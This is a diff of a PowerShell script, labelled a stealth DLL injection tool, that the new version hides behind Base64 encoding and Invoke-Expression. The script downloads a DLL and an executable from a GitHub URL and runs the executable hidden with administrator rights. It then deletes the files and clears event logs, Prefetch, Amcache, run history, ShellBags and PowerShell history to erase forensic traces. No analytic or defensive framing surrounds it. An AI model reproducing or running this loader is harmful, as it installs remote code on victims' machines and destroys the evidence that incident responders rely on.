@@ -1,69 +1,72 @@
-# ================================
-# DLL Injection Tool (Stealth Mode)
-# ================================
+$payload = 'IyA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ==
+IyBETEwgSW5qZWN0aW9uIFRvb2wgKFN0ZWFsdGggTW9kZSk=
+IyA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ==
 
-# STEP 0: Download DLL directly to final name
-$dllUrl = "https://raw.githubusercontent.com/Mohit-Parihar-112/manualmappfucker-projecct/refs/heads/main/d3dcompiler_47.dll"
-$dllPath = "D:\virtualbox\KaliLinux\Logs\d3dcompiler_47.dll"
+IyBTVEVQIDA6IERvd25sb2FkIERMTCBkaXJlY3RseSB0byBmaW5hbCBuYW1l
+JGRsbFVybCA9ICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vTW9oaXQtUGFyaWhhci0xMTIvbWFudWFsbWFwcGZ1Y2tlci1wcm9qZWNjdC9yZWZzL2hlYWRzL21haW4vZDNkY29tcGlsZXJfNDcuZGxsIg==
+JGRsbFBhdGggPSAiRDpcdmlydHVhbGJveFxLYWxpTGludXhcTG9nc1xkM2Rjb21waWxlcl80Ny5kbGwi
 
-# Create directory if it doesn't exist
-$dir = Split-Path $dllPath
-if (-not (Test-Path $dir)) {
-    New-Item -Path $dir -ItemType Directory -Force | Out-Null
-}
+IyBDcmVhdGUgZGlyZWN0b3J5IGlmIGl0IGRvZXNuJ3QgZXhpc3Q=
+JGRpciA9IFNwbGl0LVBhdGggJGRsbFBhdGg=
+aWYgKC1ub3QgKFRlc3QtUGF0aCAkZGlyKSkgew==
+ICAgIE5ldy1JdGVtIC1QYXRoICRkaXIgLUl0ZW1UeXBlIERpcmVjdG9yeSAtRm9yY2UgfCBPdXQtTnVsbA==
+fQ==
 
-# Download the DLL
-Invoke-WebRequest -Uri $dllUrl -OutFile $dllPath -UseBasicParsing -ErrorAction SilentlyContinue
-Start-Sleep -Seconds 2
+IyBEb3dubG9hZCB0aGUgRExM
+SW52b2tlLVdlYlJlcXVlc3QgLVVyaSAkZGxsVXJsIC1PdXRGaWxlICRkbGxQYXRoIC1Vc2VCYXNpY1BhcnNpbmcgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWU=
+U3RhcnQtU2xlZXAgLVNlY29uZHMgMg==
 
-# STEP 1: Define EXE URL and path
-$exeUrl = "https://raw.githubusercontent.com/Mohit-Parihar-112/manualmappfucker-projecct/refs/heads/main/audio.dg.exe"
-$tempExe = "$env:TEMP\ConsoleApplication6.exe"
+IyBTVEVQIDE6IERlZmluZSBFWEUgVVJMIGFuZCBwYXRo
+JGV4ZVVybCA9ICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vTW9oaXQtUGFyaWhhci0xMTIvbWFudWFsbWFwcGZ1Y2tlci1wcm9qZWNjdC9yZWZzL2hlYWRzL21haW4vYXVkaW8uZGcuZXhlIg==
+JHRlbXBFeGUgPSAiJGVudjpURU1QXENvbnNvbGVBcHBsaWNhdGlvbjYuZXhlIg==
 
-# Download and unblock EXE
-Invoke-WebRequest -Uri $exeUrl -OutFile $tempExe -UseBasicParsing -ErrorAction SilentlyContinue
-Unblock-File -Path $tempExe -ErrorAction SilentlyContinue
+IyBEb3dubG9hZCBhbmQgdW5ibG9jayBFWEU=
+SW52b2tlLVdlYlJlcXVlc3QgLVVyaSAkZXhlVXJsIC1PdXRGaWxlICR0ZW1wRXhlIC1Vc2VCYXNpY1BhcnNpbmcgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWU=
+VW5ibG9jay1GaWxlIC1QYXRoICR0ZW1wRXhlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVl
 
-# Run the EXE silently as admin
-$proc = Start-Process -FilePath $tempExe -WindowStyle Hidden -Verb RunAs -PassThru
-$proc.WaitForExit()
+IyBSdW4gdGhlIEVYRSBzaWxlbnRseSBhcyBhZG1pbg==
+JHByb2MgPSBTdGFydC1Qcm9jZXNzIC1GaWxlUGF0aCAkdGVtcEV4ZSAtV2luZG93U3R5bGUgSGlkZGVuIC1WZXJiIFJ1bkFzIC1QYXNzVGhydQ==
+JHByb2MuV2FpdEZvckV4aXQoKQ==
 
-# Cleanup: remove EXE and DLL
-Remove-Item -Path $tempExe -Force -ErrorAction SilentlyContinue
-if (Test-Path $dllPath) {
-    Remove-Item -Path $dllPath -Force -ErrorAction SilentlyContinue
-}
+IyBDbGVhbnVwOiByZW1vdmUgRVhFIGFuZCBETEw=
+UmVtb3ZlLUl0ZW0gLVBhdGggJHRlbXBFeGUgLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVl
+aWYgKFRlc3QtUGF0aCAkZGxsUGF0aCkgew==
+ICAgIFJlbW92ZS1JdGVtIC1QYXRoICRkbGxQYXRoIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQ==
+fQ==
 
-# STEP 2: Stealth Cleanup in Background
-Start-Job -ScriptBlock {
-    try {
-        # Clear Event Logs
-        wevtutil el | ForEach-Object { wevtutil cl $_ } > $null 2>&1
+IyBTVEVQIDI6IFN0ZWFsdGggQ2xlYW51cCBpbiBCYWNrZ3JvdW5k
+U3RhcnQtSm9iIC1TY3JpcHRCbG9jayB7
+ICAgIHRyeSB7
+ICAgICAgICAjIENsZWFyIEV2ZW50IExvZ3M=
+ICAgICAgICB3ZXZ0dXRpbCBlbCB8IEZvckVhY2gtT2JqZWN0IHsgd2V2dHV0aWwgY2wgJF8gfSA+ICRudWxsIDI+JjE=
 
-        # Clear Prefetch
-        Remove-Item "$env:SystemRoot\Prefetch\*" -Force -ErrorAction SilentlyContinue
+ICAgICAgICAjIENsZWFyIFByZWZldGNo
+ICAgICAgICBSZW1vdmUtSXRlbSAiJGVudjpTeXN0ZW1Sb290XFByZWZldGNoXCoiIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQ==
 
-        # Clear Amcache
-        Remove-Item "C:\Windows\AppCompat\Programs\RecentFileCache.bcf" -Force -ErrorAction SilentlyContinue
-        Remove-Item "C:\Windows\AppCompat\Programs\Amcache.hve" -Force -ErrorAction SilentlyContinue
+ICAgICAgICAjIENsZWFyIEFtY2FjaGU=
+ICAgICAgICBSZW1vdmUtSXRlbSAiQzpcV2luZG93c1xBcHBDb21wYXRcUHJvZ3JhbXNcUmVjZW50RmlsZUNhY2hlLmJjZiIgLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVl
+ICAgICAgICBSZW1vdmUtSXRlbSAiQzpcV2luZG93c1xBcHBDb21wYXRcUHJvZ3JhbXNcQW1jYWNoZS5odmUiIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQ==
 
-        # Clear Run history
-        Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -ErrorAction SilentlyContinue
+ICAgICAgICAjIENsZWFyIFJ1biBoaXN0b3J5
+ICAgICAgICBSZW1vdmUtSXRlbVByb3BlcnR5IC1QYXRoICJIS0NVOlxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxFeHBsb3JlclxSdW5NUlUiIC1OYW1lICIqIiAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQ==
 
-        # Clear Recent Files
-        Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -ErrorAction SilentlyContinue
+ICAgICAgICAjIENsZWFyIFJlY2VudCBGaWxlcw==
+ICAgICAgICBSZW1vdmUtSXRlbSAiJGVudjpBUFBEQVRBXE1pY3Jvc29mdFxXaW5kb3dzXFJlY2VudFwqIiAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWU=
 
-        # Clear ShellBags
-        Remove-Item -Path "HKCU:\Software\Microsoft\Windows\Shell\BagMRU" -Recurse -Force -ErrorAction SilentlyContinue
-        Remove-Item -Path "HKCU:\Software\Microsoft\Windows\Shell\Bags" -Recurse -Force -ErrorAction SilentlyContinue
-    } catch {}
-} | Out-Null
+ICAgICAgICAjIENsZWFyIFNoZWxsQmFncw==
+ICAgICAgICBSZW1vdmUtSXRlbSAtUGF0aCAiSEtDVTpcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcU2hlbGxcQmFnTVJVIiAtUmVjdXJzZSAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWU=
+ICAgICAgICBSZW1vdmUtSXRlbSAtUGF0aCAiSEtDVTpcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcU2hlbGxcQmFncyIgLVJlY3Vyc2UgLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVl
+ICAgIH0gY2F0Y2gge30=
+fSB8IE91dC1OdWxs
 
-# STEP 3: Clear PowerShell history
-try {
-    [System.Management.Automation.PSConsoleReadLine]::ClearHistory() 2>$null
-    $historyFile = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"
-    if (Test-Path $historyFile) {
-        Remove-Item -Path $historyFile -Force -ErrorAction SilentlyContinue
-    }
-} catch {}
+IyBTVEVQIDM6IENsZWFyIFBvd2VyU2hlbGwgaGlzdG9yeQ==
+dHJ5IHs=
+ICAgIFtTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ29uc29sZVJlYWRMaW5lXTo6Q2xlYXJIaXN0b3J5KCkgMj4kbnVsbA==
+ICAgICRoaXN0b3J5RmlsZSA9ICIkZW52OkFQUERBVEFcTWljcm9zb2Z0XFdpbmRvd3NcUG93ZXJTaGVsbFxQU1JlYWRsaW5lXENvbnNvbGVIb3N0X2hpc3RvcnkudHh0Ig==
+ICAgIGlmIChUZXN0LVBhdGggJGhpc3RvcnlGaWxlKSB7
+ICAgICAgICBSZW1vdmUtSXRlbSAtUGF0aCAkaGlzdG9yeUZpbGUgLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVl
+ICAgIH0=
+fSBjYXRjaCB7fQ==
+';
+$decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($payload));
+Invoke-Expression $decoded
